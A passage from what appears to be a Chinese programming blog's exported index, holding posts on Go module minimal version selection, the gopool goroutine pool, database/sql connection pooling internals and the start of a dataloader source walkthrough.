拉取最低版本的 testlib1，然后在 testlib2 中写入如下的代码： 12345678910111213141516171819package testlib2import ( \"fmt\" \"github.com/wqvoon/testlib1\")const prefix = \"testlib2@v0.0.1 \"func WrapperRegister(k, v string) &#123; fmt.Println(prefix + \"WrapperRegister\") testlib1.Register(k, v)&#125;func WrapperGetAll() &#123; fmt.Println(prefix + \"WrapperGetAll\") testlib1.GetAll()&#125; 在 testlib2 中，我们包装了 testlib1 的 Register 和 GetAll，在原本的逻辑之外输出了 testlib2 自身的版本信息。 同样，我们对这段代码进行 commit，并打上 0.0.1 的 tag。然后，我们用 go get github.com/wqvoon/testlib1@v0.0.2 拉取 0.0.2 版本的 testlib1，修改 prefix 为 “testlib2@v0.0.2 “，然后进行 commit，并打上 0.0.2 的 tag。做完这些操作，我们将拥有一个包含 2 次 commit 的 testlib2，为了能够使用这个库，可以将它发布到 github 上。 此时 testlib2 的状态如下： 12testlib2@v0.0.1 --依赖--&gt; testlib1@v0.0.1testlib2@v0.0.2 --依赖--&gt; testlib1@v0.0.2 准备 testlib3（也就是前文的 a）在 testlib3 中，首先通过 go get github.com/wqvoon/testlib2@v0.0.1 拉取最低版本的 testlib2，根据我们之前的代码，它内部依赖 0.0.1 版本的 testlib1。然后在 testlib3 中写入如下的代码： 1234567891011package mainimport ( \"github.com/wqvoon/testlib1\" \"github.com/wqvoon/testlib2\")func main() &#123; testlib2.WrapperRegister(\"name\", \"hygao\") testlib1.GetAll()&#125; 下面来进行一些 go run 与 go get 的交替操作： 12345678910111213141516171819202122232425262728# testlib1@v0.0.1 / testlib2@v0.0.1➜ testlib3 go run .testlib2@v0.0.1 WrapperRegistertestlib1@v0.0.1 Registertestlib1@v0.0.1 GetAllmap[name:hygao]# testlib1@v0.0.2 / testlib2@v0.0.1➜ testlib3 go get github.com/wqvoon/testlib1@v0.0.2go: upgraded github.com/wqvoon/testlib1 v0.0.1 =&gt; v0.0.2➜ testlib3 go run .testlib2@v0.0.1 WrapperRegistertestlib1@v0.0.2 Registertestlib1@v0.0.2 GetAllmap[name:hygao]# testlib1@v0.2.1 / testlib2@v0.0.1➜ testlib3 go get github.com/wqvoon/testlib1@v0.2.1go: upgraded github.com/wqvoon/testlib1 v0.0.2 =&gt; v0.2.1➜ testlib3 go run .testlib2@v0.0.1 WrapperRegistertestlib1@v0.2.1 Registertestlib1@v0.2.1 GetAllmap[name:hygao]# testlib1@v2.0.1 / testlib2@v0.0.1➜ testlib3 go get github.com/wqvoon/testlib1@v2.0.1go: github.com/wqvoon/testlib1@v2.0.1: invalid version: module contains a go.mod file, so module path must match major version (\"github.com/wqvoon/testlib1/v2\") 上面的输出中，有一些值得关注的点： 首先，上面的例子能够说明最终整个项目只有一个 testlib1，因为我们在 testlib3 中调用 testlib2.WrapperRegister 来向全局 map 中写入内容，调用 testlib1.GetAll 从 map 中读取内容，而不论 testlib3 使用的 testlib1 是否与 testlib2 中使用的 testlib1（也就是 0.0.1 版本）相同，输出的结果都是相同的。如果项目中存在多个 testlib1，那么某次 go run 应该输出空的 map。 其次，尽管 testlib2 中要求 testlib1 的版本是 0.0.1，但如果 testlib3 使用了更新的版本，那么根据最小版本选择算法，整个项目也会使用 testlib3 指定的版本，这一点可以通过 go run 中输出的 testlib1 的版本来验证，可以发现它是与 go get 声明的版本保持一致的。 最后，go modules 使用的版本遵循语义化版本（SemVer），根据这个规范，x.y.z 中的 y 和 z 变动时都是向下兼容的，此时最小版本选择算法可以放心使用 y.z 更大的版本而不必担心项目无法正常编译。但当 x 发生变化时，这个假设就不成立了，此时 go modules 对我们有一些更高的要求。 准备 v2 版本的 testlib1（也就是前文的 c）正如上面 go get 的提示，为了使用主版本号更新了的 testlib1，需要将 go.mod 文件中的 module 从 github.com/wqvoon/testlib1 改为 github.com/wqvoon/testlib1/v2。同时为了与前面失败的 2.0.1 作区分，我们修改 prefix 为 “testlib1@v2.0.2 “，然后做 commit 并打上对应的 tag 后将其提交到 github 上。 此时回到 testlib3，我们可以通过 go get github.com/wqvoon/testlib1/v2@v2.0.2 来拉取 v2 版本的 testlib1，拉取成功后将代码修改为如下内容： 12345678910111213package mainimport ( \"github.com/wqvoon/testlib1\" testlib1v2 \"github.com/wqvoon/testlib1/v2\" \"github.com/wqvoon/testlib2\")func main() &#123; testlib2.WrapperRegister(\"name\", \"hygao\") testlib1.GetAll() testlib1v2.GetAll()&#125; 继续执行 go run： 1234567➜ testlib3 go run .testlib2@v0.0.1 WrapperRegistertestlib1@v0.0.1 Registertestlib1@v0.0.1 GetAllmap[name:hygao]testlib1@v2.0.2 GetAllmap[] 从上面的输出中我们可以发现，此时整个项目中已经存在两个 testlib1 了，testlib2 使用 0.0.1 版本的 testlib1，testlib3 使用 2.0.2 版本的 testlib1，两者的全局 map 也不相同，所以 go run 输出了两个内容不同的 map。 一点小拓展上面的几组测试中，我们都保证了 testlib3 依赖的 testlib1 的版本大于 testlib2 依赖的 testlib1 版本。下面我们测试一下小于的情况，回到 testlib3，执行 go get github.com/wqvoon/testlib2@v0.0.2 拉取 0.0.2 版本的 testlib2，根据我们前面的配置，这个版本的 testlib2 依赖 0.0.2 版本的 testlib1。 更新了 testlib2 后，如果我们继续在 testlib3 中执行 go get github.com/wqvoon/testlib1@v0.0.1 ，就会发现 golang 进行了如下的输出： 123➜ testlib3 go get github.com/wqvoon/testlib1@v0.0.1go: downgraded github.com/wqvoon/testlib1 v0.0.2 =&gt; v0.0.1go: downgraded github.com/wqvoon/testlib2 v0.0.2 =&gt; v0.0.1 也就是说，golang 将 testlib2 也进行了降级，使整个项目能够满足用户对 testlib1 的版本要求。 那么，是否有办法强制使用 0.0.2 版本的 testlib2，但却使用 0.0.1 版本的 testlib1 呢？答案是可以使用 replace，此时 testlib3 的 go.mod 文件如下： 12345678910module github.com/wqvoon/testlib3go 1.18require ( github.com/wqvoon/testlib1 v0.0.2 github.com/wqvoon/testlib2 v0.0.2)replace github.com/wqvoon/testlib1 =&gt; github.com/wqvoon/testlib1 v0.0.1 然后执行 go run 就可以看到如下的输出了： 12345➜ testlib3 go run .testlib2@v0.0.2 WrapperRegistertestlib1@v0.0.1 Registertestlib1@v0.0.1 GetAllmap[name:hygao]","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"bytedance/gopkg 中 gopool 的源码解读","slug":"GoPool","date":"2023-04-15T17:20:49.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/04/16/GoPool/","link":"","permalink":"/2023/04/16/GoPool/","excerpt":"","text":"前言前几天从连接池的角度阅读了标准库中 database/sql 的源码，并写了对应的博客做总结。最近逛 github 时看到字节开源的 gopkg 代码库中有一个叫 gopool 的协程池实现，代码只有 200 多行，感觉还蛮有意思的，于是就有了现在的这篇文章。 功能简述根据 readme 来看，gopool 的目标是作为 go 关键字的一个可选方案，具体来说，它对外暴露了 gopool.Go 这个函数，内部接收一个函数作为入参，这个函数不接受任何参数也不返回任何内容，但因为 golang 本身有闭包的特性，所以这并不影响使用。 我个人非常喜欢 gopool 对外暴露的接口，因为它与 golang 本身的相似性使得使用起来时几乎没有什么心智负担。还是以 gopool.Go 函数为例，同 go 关键字相同，这个作为入参的函数是异步执行的，而且调用方也不会因为这个函数调用而阻塞。为了达成这个效果，gopool 不能真的起一个 goroutine，取而代之的，它用了类似 js 的任务队列的方式，因为它本身是做协程池的，如果每调一次 gopool.Go 就创建一个新协程，那这个函数就没意义了。 最后，gopool 处理了协程内部的 panic。这点很重要，因为如果你使用了某个框架来开发应用，那么你的主流程的 panic 很可能可以被这个框架捕获并优雅处理，从而保证应用整体不会因为这个 panic 而崩溃，但如果你在主流程中启动了新的协程，这个协程的 panic 就需要由你自己来保证了，而这项工作通常是重复且枯燥的，gopool.Go 在这点上提供了一种侵入性很低的解决方案。 源码解读接下来把视角回到代码本身，上面介绍的 gopool.Go 函数其实是对全局 defaultPool 变量的 CtxGo 方法的调用（golang 标准库中有很多函数也是类似的实现方式，比如 net/http 的 client 和 handler），所以如果要了解原理，就需要看 defaultPool 本身是什么。 从定义上看，defaultPool 是一个 Pool 接口的实例，由 NewPool 函数初始化，这个函数的功能很简单，它根据入参构造了一个 pool 结构，然后将这个结构返回。pool 结构是 Pool 接口的一个实现，它的定义是下面这样的： 12345678910111213141516171819202122type pool struct &#123; // 协程池的名字，有 Name 方法可以返回 name string // 这个协程池同时最多允许多少 worker 存在 cap int32 // 配置信息，目前只有一个阈值的属性，具体见下文 config *Config // task 队列的元信息，每一个 task 代表一个待执行的函数 taskHead *task taskTail *task taskLock sync.Mutex taskCount int32 // 当前有多少个 worker 在运行中，每个 worker 代表一个 goroutine workerCount int32 // 由这个协程池中的协程引发的 panic 会由该函数处理 panicHandler func(context.Context, interface&#123;&#125;)&#125; 所以从这个定义我们能知道，如果把 pool 看作是一个可操作单元，那么它内部维护了一个 task 的队列（通过链表来实现），其中的每个 task 结构代表一个待执行的函数，除此之外，它还对应多个 worker，这些 worker 从 task 中获取函数并执行。总结来说，pool.CtxGo 方法是 task 的生产者，worker 则是 task 的消费者，两者的交互通过 task 链表来完成。 下面我们直接来看 pool.CtxGo 这个方法，它也是协程池的核心方法，它的定义是这样的： 12345678910111213141516171819202122232425262728func (p *pool) CtxGo(ctx context.Context, f func()) &#123; // 从 taskPool 中取一个 task 结构体，通过复用结构体来减少 gc 压力 t := taskPool.Get().(*task) // 使用入参来初始化 task 结构 t.ctx = ctx t.f = f // 通过加锁将 task 并发安全地放在队列的尾部，并更新队列长度 p.taskLock.Lock() if p.taskHead == nil &#123; p.taskHead = t p.taskTail = t &#125; else &#123; p.taskTail.next = t p.taskTail = t &#125; p.taskLock.Unlock() atomic.AddInt32(&amp;p.taskCount, 1) // 满足条件时，从 workerPool 中取一个 worker 结构并在初始化后调用其 run 方法 if (atomic.LoadInt32(&amp;p.taskCount) &gt;= p.config.ScaleThreshold &amp;&amp; p.WorkerCount() &lt; atomic.LoadInt32(&amp;p.cap)) || p.WorkerCount() == 0 &#123; p.incWorkerCount() w := workerPool.Get().(*worker) w.pool = p w.run() &#125;&#125; 在 gopool 中，task 和 worker 都通过 sync.Pool 来实现复用。当拿到一个可用的 task 结构后，pool.CtxGo 会将它放入 task 队列的尾部，然后判断一些条件，如果满足就获取一个可用的 worker 并调用其 run 方法，否则直接退出函数。所以整个过程中与入参的 f（也就是用户希望通过 goroutine 执行的函数）的关系其实只在于将它加入到链表中，f 在 pool.CtxGo 中并没有被执行到。 worker 是真正干活的部分，它在 worker.pool 字段中保存了自己当前负责处理的 pool 结构，所以它也能间接访问到这个 pool 中的 task 链表。而它的核心方法是 worker.run。可以发现，这个方法整体就是一个普通的 goroutine，内部有一个 for 循环，循环内首先尝试从 pool 的 task 链表中获取一个任务，如果拿到的是 nil，那么说明当前 pool 内没有要执行的 task，此时会做一些收尾工作并结束整个 goroutine 的运行。而如果获取到了 task，那么它会调用其内部的 f，这个 f 对应用户传入的某个待运行的函数。执行完毕后，这个 task 会被回收到 taskPool 中供未来复用。 如果某个 task 执行时发生 panic，这个 panic 会被捕获，此时如果用户通过 pool.SetPanicHandler 设置了 pool.panicHandler，那么 recover 返回的内容会被传递给这个函数，方便用户自己做一些自定义的操作。 这里需要注意的是，为了实现 panic 的捕获，worker.run 在 for 循环内部起了一个立即执行表达式，并在内部通过 defer 来做 panic 的 recover。这是必要的，因为只有这样它才能把 panic 的影响限制在单个 task 上。否则如果放在 worker.run 的一开始，那么当某个 task panic 时整个 worker.run 函数就会结束，其他的 task 就没办法被继续执行了；而如果放在内部的 goroutine 中，worker.run 就需要在 goroutine 异常退出时创建一个新的 goroutine，这就需要引入更多的 goroutine 来做监控，因为 worker.run 本身的执行是一定不能阻塞的，否则对外暴露的 gopool.Go 就会阻塞，这就与 go 关键字的行为不一致了。 到此为止，我们就基本梳理完了协程池中 task 的创建与消费，但如果你回头看 pool 的定义，会发现它 cap 和 config 的字段没有提到，因为 pool.CtxGo 中 if 的条件我们也还没有分析。先说结论，一个 worker 就有能力消费掉 pool 中的所有 task，虽然这个消费的过程与主流程是异步的，但它自己内部其实是串行的，这意味着如果执行某个 task 需要花很长的时间，那么后面的 task 都要等这个 task 执行完才能继续被执行，所以为了解决这个问题，我们就需要有多个 worker 来一起并发消费 pool 中的 task。但通过前面的分析我们知道，一个 worker 对应一个 goroutine，而 gopool 是做协程池的，所以它必须要能够限制 goroutine 的数量。 所以总结来说，我们既需要在 task 数量达到某个值时创建新的 worker 来避免所有的 task 串行执行，又需要限制 worker 的数量不能超过某个值。这个需求就是通过前面被我们跳过的 if 来实现的，具体来说，pool.config.ScaleThreshold 定义了一个下限，当 task 的数量大于等于这个值时，新的 worker 可能会被创建，而 pool.cap 定义了一个上限，它要求 worker 的总数不能超过这个值，这两个条件同时配合起来，就能够满足我们的要求了。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"从连接池的角度阅读 database/sql 包的源码","slug":"SqlConnectionPool","date":"2023-04-12T14:46:54.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/04/12/SqlConnectionPool/","link":"","permalink":"/2023/04/12/SqlConnectionPool/","excerpt":"","text":"前言golang 标准库中的 database/sql 包提供了一种数据库的抽象，这种抽象面向接口，所以与具体的数据库无关。这意味着，开发人员几乎可以使用同一套代码来使用不同的数据库，只需要导入对应的数据库驱动即可，而这个所谓的驱动其实就是实现了 database/sql 中的接口的外部库。这里不对 database/sql 中接口的层级关系做介绍，感兴趣的朋友可以阅读 《go 语言设计与实现》的这篇文章来学习。 正如 Driver.Open 和 Connector.Connect 方法的注释所言，数据库驱动不需要自己缓存打开的连接，因为 database/sql 除了通过接口对使用者屏蔽了底层驱动间的差异外，还维护了一份连接池。本文尝试从源码的角度分析连接池，期间顺带会聊到 database/sql 本身的一些特性，为方便描述，下文将 database/sql 简称为 sql。 连接池简述“池化”通常用来复用曾经创建过的资源，是节省资源的一种很常见的方式，比如 goroutine 池和对象池，分别用于复用 goroutine 和某种对象。与之类似的，连接池是一种对连接的复用技术，广泛应用在 cs 架构中。对于一个连接池而言，常见的特性包括限制池大小、连接入池、连接出池、按需创建连接、清理过期连接、统计连接信息等，接下来分别分析下相关的特性。 源码解读获取数据库句柄sql.DB 是 sql 包对使用者暴露的数据库句柄，可以通过 sql.Open 函数获得。sql.Open 接收 driverName 和 dataSourceName 作为入参，前者用于在全局的 drivers map 中查找对应的驱动实现（这个 map 是通过调用 sql.Register 函数来写入的），后者则是一个现有标准，通常被简称为 dsn，这个东西定义了一系列连接数据库所需的参数，对应的驱动实现会通过 dsn 来完成连接的建立与初始化。 继续来看 sql.Open，当它从 drivers 中获取到驱动后，就会根据这个驱动来调用 sql.OpenDB 函数，这个函数接收 driver.Connector 作为入参，这是需要被数据库驱动实现的接口，通过调用其 Connect 方法就可以获取到一条新的数据库连接。sql.OpenDB 做的事情很简单，它把这个 driver.Connector 塞到 sql.DB 结构中，然后初始化了一些关键字段，再另起一个 goroutine 调用 sql.DB 的 connectionOpener 方法后就结束了。 这里的 sql.DB.connectionOpener 是我们遇到的第一个后台运行的 goroutine，它的逻辑很简单，内部是一个 for-select 的无限循环，当且仅当入参的 ctx.Done 函数返回时，这个循环才会结束（因为这个 ctx 是与 DB.stop 绑定的，如果 ctx.Done 返回，那么意味着整个 DB 都失效了）。除此之外，connectionOpener 会尝试从 sql.DB.openerCh 字段中读取内容，这个字段是一个 channel，表示有一个创建连接的需求，每次读到时就调用 sql.DB.openNewConnection。我们先不看这个 openNewConnection，目前只需要了解它会创建新的连接即可，详细的内容会在后面介绍。 创建或从池中获取连接从上面的描述中我们会发现，从 Open 到 OpenDB 这整个获取 sql.DB 的过程中都不曾建立过真正的数据库连接，但 sql.DB 中确实在 connector 字段中保存了被数据库驱动实现的 driver.Connector 实例，也就是说 sql.DB 是有能力建立一条真正的数据库连接的。事实上，sql.DB 的连接是延迟建立的，也就是说只有真正需要用到连接时才会去创建第一条连接。那么什么时候会创建连接呢，通常是通过 sql.DB 来与数据库交互的时候，这里的交互指的是 DB.PingContext、DB.QueryContext、DB.ExecContext。 通过查看代码，可以发现它们几乎有着同样的代码结构，都是先最多尝试 maxBadConnRetries 次以 cachedOrNewConn 这个策略调用一个非导出函数，如果均失败且失败原因是 driver.ErrBadConn，那么尝试以 alwaysNewConn 这个策略调用同样的函数。如果展开 DB.exec 和 DB.query，那么这三个数据库交互函数的结构基本就完全一样了，cachedOrNewConn 和 alwaysNewConn 都是传给 DB.conn 函数的。 下面继续来看 DB.conn 这个函数，它的作用是获取一条数据库连接，而前面说的 cachedOrNewConn 和 alwaysNewConn 对它而言是获取连接的策略，前者意味着“从连接池中获取连接或创建一个新的连接”，后者意味着“直接创建一条新连接”。它们两个的区别在于是否会尝试从 DB.freeConn 中获取连接，这个字段保存曾经打开的但目前没在使用的连接，也就是连接池的实体部分。当策略为 cachedOrNewConn 且 DB.freeConn 中有内容时，就获取里面的第一个连接（这里弹出第一个连接的方式比较有考虑，感兴趣的朋友可以想想为什么不直接用 db.freeConn[1:] 的方式），然后通过提前设置的 DB.maxLifetime 判断它是否过期，当过期时会直接返回 driver.ErrBadConn，此时如前所述，调用者会重试 maxBadConnRetries 次。除此之外，DB.conn 还会按需调用驱动实现的 ResetSession 来重置连接。 如果 freeConn 中没有空闲的连接，或者 caller 已经重试了 maxBadConnRetries 次，那么就需要创建新的连接了。通常而言，只需要通过调用 DB.connector.Connect 方法，也就是数据库驱动实现的用于创建连接的方法即可。然而 sql 包支持设置连接的最大数量（不是连接池的最大容量），那么当多个 goroutine 都尝试创建新的数据库连接时，DB.conn 需要保证整体的连接数量是小于等于允许的最大连接数的。在实现上，DB.numOpen 记录了当前打开的连接数量，DB.maxOpen 记录了允许打开的最大连接数量，当 DB.numOpen &gt; DB.maxOpen 时，就需要阻塞当前的 goroutine 直到有空闲的连接可以使用。sql 通过 select 来实现阻塞，它先把当前 goroutine 对连接的“需求”封装成一个 connRequest 的 channel，然后再通过 select 尝试从这个 channel 中读取数据，如果能读到，那么它就能从中获取一条数据库连接并继续后面的逻辑。不难猜到，当且仅当其他 goroutine 释放了其占用着的连接，也就是将其放回连接池时，当前阻塞的 goroutine 才能接手这个连接，因为这样整体上连接的数量才不会变，下面我们就来看一下放回连接的部分。 将连接放回连接池用户通过 DB 句柄与数据库交互前，需要先通过 DB.conn 来新建或从连接池中获取连接，那么当这个交互完成时，就可以释放掉前面获得的连接了。还是回到 DB.PingContext、DB.QueryContext、DB.ExecContext，它们内部在调用 DB.xxxDC 时接受了 driverConn 的 releaseConn 方法作为参数，当 DB.xxxDC 结束时，releaseConn 就会被调用，而这个方法的逻辑很简单，仅仅只是调用了 DB.putConn 方法。 从名字上看，DB.putConn 的作用是将连接放回连接池。具体到代码中，如果这个连接不是 driver.ErrBadConn，也就是说连接当前还可用，那么 DB.putConn 就会尝试调用 DB.putConnDBLocked，这个方法真正用于将连接放回连接池，并返回是否放回成功，当不成功时代表连接池已经满了，此时 DB.putConn 会直接调用 driverConn.Close 来关闭这个连接。 继续来看 DB.putConnDBLocked，它首先会判断当前是否有 goroutine 因为获取不到连接而阻塞，如果存在这样的 goroutine，那么把当前连接通过对应 goroutine 的 connRequest channel 转让给它，此时 putConnDBLocked 会返回 true 避免 caller 认为连接放回连接池失败并关闭 driverConn。而如果没有阻塞中的 goroutine，那么 putConnDBLocked 会判断 DB.freeConn 中的连接是否达到 DB.maxIdleConn，即允许空闲的最大连接数量，如果没有达到，那么将该连接加入到 DB.freeConn 中并返回 true，否则返回 false 通知 caller 关闭连接。 需要注意的是，DB.maxIdleConn 与 DB.maxOpen 不同，前者代表“最多有多少空闲连接”，后者代表“最多有多少连接”，所以前者是一定小于等于后者的，从语义上讲，前者就是连接池的最大容量。 这里讲的是正常的流程，但 DB.putConn 接收到的连接很可能是有问题的，这里的问题就是 driver.ErrBadConn，这通常发生于数据库服务端主动断开连接。当连接的状态是有问题的时候，DB.putConn 就会直接关闭这个连接。但与此同时，它还会调用 DB.maybeOpenNewConnections，这是为了对新建连接这个操作进行兜底，被多个 err != nil 的地方调用。 新连接兜底从名字上看，DB.maybeOpenNewConnections “可能”会创建一个新的连接。它通常被用于新连接的兜底，偶尔就会被调用一下，服务于那些由于拿不到连接而阻塞的 goroutine。 具体到代码中，它会判断当前有多少个 goroutine 因为获取不到连接而阻塞，如前所述，每一个这种 goroutine 都对应一个 connRequest，所有的 connRequest 被放在 DB.connRequests 字段中。但我们不能 DB.connRequests 中有多少个元素就创建多少个连接，而是要结合 DB.maxOpen 的值来判断，如前所述，这个值的含义是“最多允许建立多少条数据库连接”。当 DB.maxOpen 大于 0 时，DB.maybeOpenNewConnections 会计算 DB.maxOpen - DB.numOpen 的值，这个值的含义是“还能创建多少条数据库连接”。 所以 min(len(DB.connRequests), (DB.maxOpen-DB.numOpen)) 的值，就是当前可以创建的连接数量，我们假设它为 n，那么 DB.maybeOpenNewConnections 就会向 DB.openerCh 中写入 n 次。如果你还有印象的话，我们前面提到，sql.OpenDB 函数创建了一个 goroutine，这个 goroutine 做的就是不断尝试从 DB.openerCh 中读取内容，当有内容时就调用 DB.openNewConnection 来创建新的连接。 下面来看下 DB.openNewConnection 的逻辑，它首先就调用驱动实现的 Connector.Connect 创建了一个连接，如果连接创建失败，它会调用 DB.putConnDBLocked，但这里对这个函数的使用不同于我们前面的描述，它会将驱动返回的错误传递进去，这个错误会一路通过 connRequest 传给对应的 gouroutine 从而使其结束阻塞，并在 err 为 sql.ErrBadConn 时进行重试。除此之外，它会再次调用 DB.maybeOpenNewConnections，这样新的一轮 DB.openNewConnection 调用就会按需被发起。 另一方面，如果 DB.openNewConnection 成功通过数据库驱动创建了一条连接，那么它同样会调用 DB.putConnDBLocked，只不过会将连接传递进去，此时 DB.putConnDBLocked 的作用就和我们前面提到的是相同的，当这个函数返回 false 时，说明已经不能再创建新的连接了，此时调用 Close 来关闭刚刚创建的连接。 过期连接清理由于网络环境的不稳定，我们无法保证池子中的连接是可用的，虽然在使用时 sql 会适度重试，但这种重试是很影响效率的。为了解决这个问题，通常有两种方案。第一是定期通过池子中的连接 ping 一下，如果成功那么保留，否则丢弃掉连接；第二种是为每个连接设置最大可用时长，超过这个时长的连接会被丢弃。两种方式各有利弊，sql 选择了第二种。 当我们通过 DB.SetConnMaxLifetime 设置 DB.maxLifetime 或通过 DB.SetConnMaxIdleTime 设置 db.maxIdleTime 时，它们均会调用 DB.startCleanerLocked，这个函数的作用是按需初始化 DB.cleanerCh，然后新起一个协程调用 DB.connectionCleaner，这是我们遇到的第二个后台运行的 goroutine。 与 DB.connectionOpener 类似，DB.connectionCleaner 也是一个通过 for+select 来运行的协程，但不同的是它的退出条件更容易满足。select 中有两个 case，一个用于每隔一段时间执行一次，这通过在循环中对 Timer 调用 Reset 实现，另一个则从 DB.cleanerCh 中读取内容。不管命中了哪个 case，DB.connectionOpener 的作用都是寻找那些已经过期的连接，然后分别对它们调用 Close 来进行关闭。 当前 DB.cleanerCh 的写入方有两处，分别是前面提到的 DB.SetConnMaxLifetime 和 DB.SetConnMaxIdleTime，当设置的新值比旧值小的时候会通知 DB.connectionOpener 强制执行一次清理。 Tx 和 Stmt 如何使用连接上面描述的过程概括了常规的数据库交互方式，简单来说就是交互前尝试获取一个连接，这个连接可能是新建的也可能是从连接池中拿到的，交互结束再把连接放回池子里，如果池子满了就把连接关掉。但 sql 中有一些交互不适用于这个过程，比较典型的是 sql.Tx 和 sql.Stmt。 sql.Tx 代表事务，它是一个句柄，可以通过 DB.BeginTx 来获得，用户拿到这个句柄后，可以通过 sql.Tx 调用与 sql.DB 类似的方法，然后调用 Tx.Commit 或 Tx.Rollback 来完成事务的处理。对应到数据库上，就是要先送一条语句过去开启事务（比如 BEGIN），然后执行一些操作，再按需执行 COMMIT 或 ROLLBACK。这里最大的问题在于，事务是不能跨连接的，也就是说，在提交或回滚之前，Tx 的所有操作都应该是通过同一条连接来完成的，这意味着 Tx 需要独占某一条连接。 在实现上，DB.BeginTx 展开后和前面提到的其他交互函数相同，也是调用了 db.conn 来获取连接，但 db.beginDC 和前面的几个 db.xxxDC 不同，它没有通过 defer 来调用 driverConn.releaseConn，这也就意味着当 DB.beginDC 将 BEGIN 命令发送给数据库后，之前获取的连接并不会放回连接池。与之相对的，db.beginDC 将 releaseConn 记录在 Tx.releaseConn 字段内，当 Tx.Commit 或 Tx.Rollback 被调用时，这个函数就会被调用到，此时 Tx 独占的连接就可以被释放了。 从这里我们就能看到，在写业务代码时应该尽量避免长事务，因为每个事务都会独占一条数据库连接，如果限制了 DB.maxOpen 的值，那么很快就达到限制了，此时那些想要获取连接的 goroutine 都会因为迟迟拿不到连接而阻塞在 connRequest。 接下来再来看 sql.Stmt，这个东西对应数据库中的 prepare 语句，它同样是一个句柄，可以通过 DB.PrepareContext 来获得。同 Tx 一样，Stmt 是不能跨 session 的，所以理所当然的，我们可以把 Stmt 实现成 Tx 的方式，即每个 Stmt 独占一条连接。然而，和 Tx 不同的是，Stmt 是一个长期存在的东西（即它本身不存在 commit 和 rollback），而且由于它能够提高 sql 的执行效率，所以对于一个高效的系统，Stmt 应该是会被经常使用的东西。这两点特性决定了我们无法用实现 Tx 的方式来实现 Stmt，否则这个长期存在的东西会一直占据连接的份额，就相当于系统中有了一个几乎不会结束的事务。 因此，DB.prepareDC 中使用 defer 调用了 driverConn.releaseConn 来释放对应的连接，这意味着当 DB.prepareDC 被调用后，所有连接中有一条连接是被 prepare 过的。但是，正是由于连接池的存在，所以这条连接不一定会被哪个 goroutine 使用，那么当用户使用 Stmt 与数据库交互时，如何确保获取到一条 prepare 过的连接呢？ 事实上，Stmt.css 中记录了一个 connStmt 列表，每个 connStmt 中记录了一个 prepare 过的 driverConn 和对应的 driverStmt。当用户使用 Stmt 与数据库交互时，首先会调用 Stmt.connStmt 方法，这个方法会尝试获取一条连接，然后遍历 Stmt.css，如果 Stmt.css 中某一项的 driverConn 与 DB.conn 获取到的 driverConn 相等，那么这一项的 driverStmt 就可以直接拿来使用，因为这意味着对应的连接已经被 prepare 过。 但我们不能总是这样幸运，当 Stmt.css 中没有与之匹配的 driverConn 时，就说明我们拿到了一条未经 prepare 的连接，此时需要通过 Stmt.prepareOnConnLocked 来对这个连接执行 prepare 并获取对应的 driverStmt，然后通过这个 driverStmt 来执行操作。除此之外，Stmt.prepareOnConnLocked 还会将这对新的 driverConn 和 driverStmt 放入到 Stmt.css 中，避免下次在使用 Stmt 时重复对同一条连接执行 prepare。 统计连接池信息最后也是最简单的一个连接池特性，就是获取统计数据，这可以通过 DB.Stats 方法获取。我们前面讨论的各个操作中会在 DB 结构中记录一些内容，比如”有多少连接因为过期而被关闭“，“有多少 goroutine 因为获取不到连接而阻塞”等等，但直到我们调用 DB.Stats 时，这些数据仍在变化着，所以我们需要对调用时的状态做一个快照，具体到代码中，sql 定义了 DBStats 结构，用于保存 DB.Stats 方法被调用时 DB 中各个统计字段的状态，因为这个结构体中没有指针字段，所以后续 DB 中统计字段的变化不会对这个结构有任何影响，这样就实现了统计数据的快照。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"浅析 dataloader 源码","slug":"DataLoader","date":"2023-04-05T00:32:34.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/04/05/DataLoader/","link":"","permalink":"/2023/04/05/DataLoader/","excerpt":"","text":"代码地址：graph-gophers/dataloader at v6.0.0 (github.com) 前言dataloader 是 Facebook 提出的一种获取资源的方式，其最初的目的是为了解决 GraphQL 查询数据时的 N+1 问题，但这种加载数据的方式其实很普适。 宏观上看 dataloader，它主要有批量请求（batch）和缓存这两个机制，批量请求的意思是 dataloader 在加载数据前会“等”一段时间，把一个时间窗口内的所有请求聚合成一个 batch 然后下发。举例来说，假设我们有一个接口可以根据一批 user_id 来获取对应用户的个人信息，那么我们就可以在这个接口前套一层 dataloader，这样当间隔很近的 a、b、c 三个请求分别想获取 user_id 为 1、2、3 的用户信息时，dataloader 会将它们聚合成一个批量请求，通过这个请求拿到数据后再向上将结果分别返回给这三个源请求。在这个过程中，a、b、c 不需要感知 dataloader 的聚合，他们甚至不需要感知彼此的存在。 然而光有 batch 还不够，因为会有入参重复的问题。比如上面假设的场景中，如果 a、b、c 都要获取 user_id 为 1 的用户信息，那么 batch 会将它们聚合为一个入参有三个 1 的请求，而这批参数其实是冗余的。所以，我们需要保存“正在处理中的 id”的处理过程，并可以根据这个过程来拿到最终的处理结果，这里说的有点抽象，其实这和 singleflight 的原理是类似的，最终目的都是要保证同一时间多个同样的 user_id 只会触发一次回源，即 duplicate suppression。 另一方面，缓存的实现可以根据业务场景而有所不同，比如对于一些变更不频繁的资源，缓存不仅可以用于去重，还可以通过延长缓存时间来减少回源，进一步降低下游服务的压力。 为了更好地理解 dataloader 的运行机制，本文尝试分析 graph-gophers/dataloader 6.0.0 版本的源码，在下文中，这个仓库会被简称为 dataloader。 源码解读dataloader 中的核心结构是 Loader 结构体，这个结构体可以通过 NewBatchedLoader 函数来创建，该函数接收一个 batch 函数作为固定入参，这个函数的作用是根据一批 key 来获取对应的一批 Result 结构，具体的获取逻辑由调用方决定；除此之外，这个初始化方法还通过 functional-options 的方式来为 Loader 的一些核心字段赋值。 Loader 结构体实现了 dataloader.Interface 接口，其中逻辑最复杂的是 Load 方法，这个方法用于根据单个 key 获取对应的 Thunk 结构，是我们研究的重心。这里的 Thunk 其实是一个闭包，它封装了获取结果的操作，调用方只需要调用它就可以等着拿入参对应的资源了，并不需要关心 Loader 在这个过程中做了什么。Thunk 其实就是我们前面提到的“正在处理中的 id”的处理过程，具体而言，Loader 针对每一个 Key 做了缓存，缓存的内容就是 